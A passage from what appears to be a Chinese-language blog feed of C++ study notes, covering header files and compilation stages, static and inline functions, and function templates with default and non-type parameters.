class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//main.cpp</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> std::cout;</span><br><span class="line"><span class="keyword">using</span> std::endl;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>创建两个源文件叫啥无所谓，但是记住一个程序只有一个main函数，所以分文件写也要注意不要出现多个main。<br>其次就是因为是项目文件，编译的时候一起编译了，但是如何在main.cpp使用function的函数呢？<br>前面提到过函数本身具有全局性，但是要先有一个声明.</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> std::cout;</span><br><span class="line"><span class="keyword">using</span> std::endl;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Ave</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">cout &lt;&lt; <span class="built_in">Ave</span>(<span class="number">3</span>, <span class="number">8</span>) &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; <span class="built_in">Add</span>(<span class="number">5</span>, <span class="number">10</span>) &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/06/09/translater/000.png" class=""><p>可以看到声明之后确实能用了，但是如果有很多很多函数，在不同文件想使用它们，每次都要声明一堆也很麻烦，这就要归功于inclue了，将这个文件当头文件引用之后就省去了许多麻烦。</p><p>创建一个function.h的文件，将函数声明放置其中。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//function.h</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Ave</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//除了声明，其实定义也可以直接写在这里。但是为什么少用看后面编译过程~</span></span><br></pre></td></tr></table></figure><p>在main.cpp文件中引用头文件<code>#include&quot;function.h&quot;</code>;</p><blockquote><p>“”和&lt;&gt;的区别其实就在于前者是引用非库文件，后者引用的都是库里标准的头文件</p></blockquote><p>插一嘴C语言编译过程的四个步骤：<br>C语⾔编译过程分成四个步骤：</p><ol><li>由.c⽂件到.i⽂件，这个过程叫预处理</li><li>由.i⽂件到.s⽂件，这个过程叫编译</li><li>由.s⽂件到.o⽂件，这个过程叫汇编</li><li>由.o⽂件到可执⾏⽂件，这个过程叫链接</li></ol><p>那么预处理的时候，它会将所有include的头文件或者宏定义替换展开成真正的内容，就比如头文件里面的声明和定义等。<br>编译事实上就是将高级语言逐步翻译成机器语言的过程，这里先翻译成汇编代码。【高级语言-&gt;汇编-&gt;机器码(2进制)。】<br>汇编也就是将汇编代码翻译成之前说的机器码。<br>链接过程使用链接器将该目标文件与其他目标文件、库文件、启动文件等链接起来生成可执行文件。</p><p>也说明了头文件不会主动编译，因为只有它被调用编译之后才会展开。这也就回到上面为什么不推荐头文件直接写定义，当另一个cpp文件也去包含这个头文件，编译的时候展开，会有多个函数发生重复定义现象。<br>如果能保证不被多次调用倒是能直接定义。</p><p>那么哪些适合写在头文件：</p><hr><h3 id="static"><a href="#static" class="headerlink" title="static"></a>static</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">hhh</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于static的限制，它只能在文件所在的编译单位内使用，不能在其它编译单位内使用。<br>也就是说写于头文件的静态函数，被其他文件引用后，不会互相访问，包括静态变量。</p><hr><h3 id="inline"><a href="#inline" class="headerlink" title="inline"></a>inline</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">hhh</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>内联就更不用说了，本身结构简单的话就直接被替换了，算是一种老式优化，所以也不存在冲突的问题，但是通过替换简单的代码，无非就是以空间换时间的做法。</p><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>有的时候编译器能稍微人性化</p>]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>function10-static/inline</title>
      <link href="/2022/06/09/function10/"/>
      <url>/2022/06/09/function10/</url>
      
        <content type="html"><![CDATA[<h1 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h1><ul><li>static</li><li>inline<br>这俩在C语言中也出现过所以不陌生。</li></ul><span id="more"></span><hr><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><strong>勿忘模板，二刷常态</strong>~~哈哈哈</p><p>static 通常用作声明静态变量<br><code>static type name</code>例如：<code>static int a;</code><br>static变量如果没有指定初始化，那么会自动初始化为0，且只能初始化一次。<br>而且静态变量即使离开作用域也不会立刻销毁，说明不是存在于栈区的数据。</p><p>inline 将函数以内联的方式嵌入到调用的函数。<br><code>inline int Add(int a,int b)&#123; return a+b; &#125;</code><br>内联函数会建议编译器把这个函数处理成内敛代码以提升性能，但是否采用看编译器决定。</p><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="static"><a href="#static" class="headerlink" title="static"></a>static</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> std::cout;</span><br><span class="line"><span class="keyword">using</span> std::endl;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">hhh</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> a = <span class="number">1000</span>;</span><br><span class="line">a++;</span><br><span class="line">cout &lt;&lt; a &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="built_in">hhh</span>();</span><br><span class="line"><span class="built_in">hhh</span>();</span><br><span class="line"><span class="built_in">hhh</span>();</span><br><span class="line"><span class="built_in">hhh</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>多次调用后发现static的值是累积的，说明函数结束后static的确没有被释放</p><img src="/2022/06/09/function10/000.png" class=""><p>但是作用域还是在那块函数内，就是说离开那个函数无法对变量进行操作。除非生成一个全局的静态变量，也就是将其放在main函数头上。</p><hr><h2 id="inline"><a href="#inline" class="headerlink" title="inline"></a>inline</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">add</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> x = <span class="built_in">add</span>(<span class="number">1</span>,<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>正常情况下调用add函数的汇编无非就是两个参数压入栈，然后call到函数地址，运行完后add esp,8恢复栈平衡。<br>但是如果是内联函数，编译器就有可能进行优化:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">int</span> <span class="title">add</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> x = <span class="built_in">add</span>(<span class="number">1</span>,<span class="number">2</span>);       <span class="comment">//有可能就直接被优化成 int x = 1+2;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但需要注意是有可能，现代编译器的智能化更明显，编译选项本身就有优化选项，所以不能百分之百确定会怎么被优化。<br>当然inline优化一般也是针对函数体比较简单的情况下，复杂的时候雀食不好优化得交给编译器处理。</p><blockquote><p>反汇编的时候，debug可能还是保留过程，release大概会优化</p></blockquote><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>inline在后面就越来越少了，static还有其他用武之处放后面用到再说。<br>当然操作肯定不会局限于一个源文件下编译的时候，当这俩存在头文件中或者其他源文件又会怎么调用。</p>]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>function9-自动推导模板</title>
      <link href="/2022/06/08/function9/"/>
      <url>/2022/06/08/function9/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>自动推导的用处配合上模板大概才有真正的火花</p><span id="more"></span><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">Ave</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> (a + b) / <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Ave</span><span class="params">(<span class="type">float</span> a, <span class="type">int</span> b)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> (a + b) / <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">double</span> <span class="title">Ave</span><span class="params">(<span class="type">int</span> a, <span class="type">float</span> b)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> (a + b) / <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先瞅一个函数重载，我们简单做个模板:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span></span><br><span class="line"><span class="function">T <span class="title">Ave</span><span class="params">(T a, T b)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> (a + b) / <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>但是这个模板似乎只能适应第一个函数，为什么呢？<br>因为T只代表了一个类型，所以当你函数的参数类型不同时，单纯的参数就搞不明白了。</p></blockquote><p>聪明娃一下子就想到用两个参数了：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T1,<span class="keyword">typename</span> T2&gt;</span></span><br><span class="line"><span class="function">T1 <span class="title">Ave</span><span class="params">(T2 a, T1 b)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> (a + b) / <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是这种虽然是两种参数了，而且返回值是根据模板1来的，还是有点糙。<br>你说用<code>&lt;&gt;</code>去指定1和2是什么类型的参数，其实意义也没有太大。</p><p>且看重载的第三个函数，发现返回值，参数都不相同。。要用模板就要用三个了。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T1,<span class="keyword">typename</span> T2,<span class="keyword">typename</span> T3&gt;</span></span><br><span class="line"><span class="function">T3 <span class="title">Ave</span><span class="params">(T1 a, T2 b)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> (a + b) / <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用三个模板就有不好使的点</p><ol><li>T1和T2可以通过形参去确定类型，返回值似乎就成了孤儿</li><li>虽然可以指定，但是这种写法就要一次性指定三个了，除非说T1做返回值类型，这样倒是只要做一个指定<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">  <span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T1,<span class="keyword">typename</span> T2,<span class="keyword">typename</span> T3&gt;</span></span><br><span class="line"><span class="function">T1 <span class="title">Ave</span><span class="params">(T2 a, T3 b)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> (a + b) / <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="built_in">Ave</span>&lt;<span class="type">int</span>&gt;(<span class="number">100</span>,<span class="number">200.0f</span>) &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><p>学习了函数模板不要拘束自己的思想：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T1,<span class="keyword">typename</span> T2,<span class="keyword">typename</span> T3&gt;</span></span><br><span class="line"><span class="function">T1 <span class="title">Ave</span><span class="params">(T2 a, T3 b,<span class="type">int</span> c)</span></span>&#123;</span><br><span class="line">T3 x;</span><br><span class="line">T2 *p;</span><br><span class="line"><span class="keyword">return</span> (a + b) / <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>虽然上面是给编译器提供了一个模板，但是下面本质还是自定义参数，你仍可以使用它完成函数能完成的操作</p></blockquote><hr><h2 id="玩一玩闹一闹"><a href="#玩一玩闹一闹" class="headerlink" title="玩一玩闹一闹"></a>玩一玩闹一闹</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T1,<span class="keyword">typename</span> T2&gt;</span></span><br><span class="line"><span class="function"><span class="keyword">decltype</span>(<span class="keyword">auto</span>) <span class="title">toMax</span><span class="params">(T1 &amp;a, T2 &amp;b)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> a &gt; b ? a : b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">float</span> a = <span class="number">1000</span>;</span><br><span class="line"><span class="type">int</span> b = <span class="number">15464894</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">toMax</span>(a,b);<span class="comment">//猜想一下toMax的返回值类型是什么？为什么？</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>ps: 不同类型直接的引用存在类型转换问题</p></blockquote><hr><h2 id="回顾正式-函数模板参数的默认值"><a href="#回顾正式-函数模板参数的默认值" class="headerlink" title="回顾正式-函数模板参数的默认值"></a>回顾正式-函数模板参数的默认值</h2><p>在玩函数的时候我们知道可以给形参赋予默认值，以应对一些情况不是很有必要输入的地方。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">stringL</span><span class="params">(<span class="type">char</span> &amp;a, <span class="type">int</span> len, <span class="type">bool</span> flag=<span class="literal">true</span>)</span></span>&#123;</span><br><span class="line"><span class="comment">//只是假设，没有啥大意义</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么函数模板的参数也就是<code>typename T=xxx</code>之类的操作</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T1=<span class="type">int</span>,<span class="keyword">typename</span> T2=<span class="type">double</span>&gt;</span><br><span class="line"><span class="comment">//指定完类型甚至都不用推导了，当然不可能都指定类型，不然还要这种模板干什么。</span></span><br></pre></td></tr></table></figure><p>拿我们之前说的三个模板参数的问题：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T1,<span class="keyword">typename</span> T2,<span class="keyword">typename</span> T3&gt;</span></span><br><span class="line"><span class="function">T1 <span class="title">Ave</span><span class="params">(T2 a, T3 b)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> (a + b) / <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="built_in">Ave</span>&lt;<span class="type">int</span>&gt;(<span class="number">100</span>,<span class="number">200.0f</span>) &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要指定一下返回值类型在每次调用的时候都指定也挺累，所以可以使用默认值</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T1</span>=<span class="type">int</span>,<span class="keyword">typename</span> T2,<span class="keyword">typename</span> T3&gt;</span><br><span class="line"><span class="function">T1 <span class="title">Ave</span><span class="params">(T2 a, T3 b)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> (a + b) / <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="built_in">Ave</span>(<span class="number">100</span>,<span class="number">200.0f</span>) &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>还有一种用法就是让一个参数&#x3D;前面某个参数的类型：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T1,<span class="keyword">typename</span> T2,<span class="keyword">typename</span> T3</span>=T1&gt;</span><br><span class="line"><span class="function">T1 <span class="title">Ave</span><span class="params">(T2 a, T3 b)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> (a + b) / <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="built_in">Ave</span>(<span class="number">100</span>,<span class="number">200.0f</span>) &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当然用法归用法，怎么用还得看你想怎么实现。</p><p><strong>既然有指定模板类型参数，就衍生了非类型的模板参数</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T1,<span class="keyword">typename</span> T2,<span class="keyword">typename</span> T3</span>=T1,<span class="type">int</span> max,<span class="type">int</span> min&gt;</span><br><span class="line"><span class="function">T1 <span class="title">Ave</span><span class="params">(T2 a, T3 b)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> (a + b) / <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样有点不直观，随便找个例子：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T,<span class="type">int</span> max,<span class="type">int</span> min&gt;</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">testHp</span><span class="params">(T &amp;hp, T shanghai)</span></span>&#123;</span><br><span class="line">hp -= shanghai;</span><br><span class="line"><span class="keyword">if</span> (hp &gt; max || hp &lt; min) hp = <span class="number">0</span>; <span class="comment">//假设异常就=0直接给他抬走，实际游戏肯定不会这么无赖</span></span><br><span class="line"><span class="keyword">return</span> hp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> hp = <span class="number">1000</span>;</span><br><span class="line"><span class="built_in">testHp</span>(hp, <span class="number">100</span>);<span class="comment">//肯定会报错</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/06/08/function9/000.png" class=""><p>因为我们忽略了模板max和min。但是这样写在后面，然后你指定的时候它是顺位来的所以要修改一下</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="type">int</span> max,<span class="type">int</span> min, <span class="keyword">typename</span> T&gt;</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">testHp</span><span class="params">(T &amp;hp, T shanghai)</span></span>&#123;</span><br><span class="line">hp -= shanghai;</span><br><span class="line"><span class="keyword">if</span> (hp &gt; max || hp &lt; min) hp = <span class="number">0</span>; </span><br><span class="line"><span class="keyword">return</span> hp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> hp = <span class="number">1000</span>;</span><br><span class="line"><span class="built_in">testHp</span>&lt;<span class="number">1200</span>,<span class="number">900</span>&gt;(hp, <span class="number">100</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/06/08/function9/001.png" class=""><p>可以看到hp的值改变了</p><p>回过头，max和min算什么？肯定不是变量，因为它俩存在于模板参数定义中。<br>虽然模板的特色就是替换，但max目前是被替换成了1200，这就是临时的常量，肯定是不能被修改的，有疑惑可以去函数里试试能不能修改max或者min。<br>然后传递个变量：<img src="/2022/06/08/function9/002.png" class=""> 看到报错了<br>但是把x设置为常量：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">int</span> x = <span class="number">1200</span>;</span><br><span class="line"><span class="type">int</span> hp = <span class="number">1000</span>;</span><br><span class="line"><span class="built_in">testHp</span>&lt;x,<span class="number">900</span>&gt;(hp, <span class="number">100</span>);</span><br></pre></td></tr></table></figure><p>这样是没问题的。</p><p><strong>也就是说在模板参数里的非类型参数是算常量</strong></p><p>最后鸡贼的时候，默认参数默认参数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="type">int</span> max</span>=<span class="number">1200</span>,<span class="type">int</span> min=<span class="number">1000</span>, <span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="type">bool</span> <span class="built_in">testHp</span>(T &amp;hp, T shanghai)&#123;</span><br><span class="line">hp -= shanghai;</span><br><span class="line"><span class="keyword">if</span> (hp &gt; max || hp &lt; min) hp = <span class="number">0</span>; </span><br><span class="line"><span class="keyword">return</span> hp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">template&lt; typename T, int max=1200,int min=1000&gt;</span></span><br><span class="line"><span class="comment">bool testHp(T &amp;hp, T shanghai)&#123;</span></span><br><span class="line"><span class="comment">hp -= shanghai;</span></span><br><span class="line"><span class="comment">if (hp &gt; max || hp &lt; min) hp = 0; </span></span><br><span class="line"><span class="comment">return hp;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>就不需要指定了，默认给了，如果不想改动，一般就放到后面就行了</p><hr><h2 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h2><p>利用模板计算数组平均数：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span 